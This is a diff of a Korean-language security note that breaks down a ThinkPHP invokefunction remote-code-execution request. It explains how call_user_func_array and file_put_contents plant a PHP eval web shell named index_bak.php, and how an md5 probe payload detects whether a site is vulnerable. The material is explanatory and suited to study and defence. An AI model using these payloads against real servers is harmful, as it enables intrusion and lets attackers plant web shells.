@@ -47,15 +47,19 @@ https://www.example.com/index.php?s\=/Index/\\think\\app/invokefunction&function
 
 * `&function\ll_user_func_array`
 
-  * `call_user_func_array`(PHP 표준 함수)는 첫번째 인수에 호출할 함수(예: `file_put_contents`), 두번째 인수에 인수 배열을 받아 **임의 함수 호출**을 가능하게 합니다.
+  * `call_user_func_array(함수명, 인자 배열)`은 임의 함수 호출이 가능한 PHP 함수로, 취약한 환경에서는 공격자가 임의 함수 + 임의 파라미터 조합으로 RCE가 가능합니다.
+  * 첫번째 인수에 호출할 함수(예: `file_put_contents`), 두번째 인수에 인수 배열을 받아 **임의 함수 호출**을 가능하게 합니다.
 
 * `&vars[0]=file_put_contents`
 
+  * `vars[0]` = 첫 번째 파라미터 = 호출할 함수 이름
   * 호출하려는 함수: `file_put_contents` — 파일을 생성/쓰기하는 PHP 표준 함수. 즉 목적은 파일 생성(웹셸 저장).
 
 * `&vars[1][]=index_bak.php`
 
+  * `vars[1]` = 두 번째 파라미터 = 함수 인자 배열
   * `file_put_contents`의 첫 번째 인자(파일명) — 웹서버가 접근 가능한 경로(웹루트)에 index_bak.php로 생성되면 곧바로 웹에서 실행 가능해질 수 있습니다.
+  * 즉 `file_put_contents("index_bak.php")` 형태
 
 * `&vars[1][]=<?php%20@eval($_POST['pwd']);?>hello`
 
@@ -77,7 +81,9 @@ https://www.example.com/index.php?s\=/Index/\\think\\app/invokefunction&function
 &vars[1][]=HelloThinkPHP
 ```
 
-* 의도: 내부에서 `call_user_func_array('md5', ['HelloThinkPHP'])` 실행 유도 → 응답으로 MD5가 나오면 호출 성공.
+* 내부에서 `call_user_func_array('md5', ['HelloThinkPHP'])` 실행 유도 → 응답으로 MD5가 나오면 호출 성공.
+* 여기서는 `md5`로 harmless하게 넣어 정상 동작을 확인하는 테스트로, 공격을 위한 다른 함수명이 들어가면 **임의 코드 실행 가능성**↑
+* `md5("HelloThinkPHP")` 형태의 **취약점 존재 여부를 판단하는 탐지용 페이로드**로, md5 결과가 반환되는지 확인 → 코드가 실행되는지 테스트
 
 
 ### 완전한 RCE가 되려면 
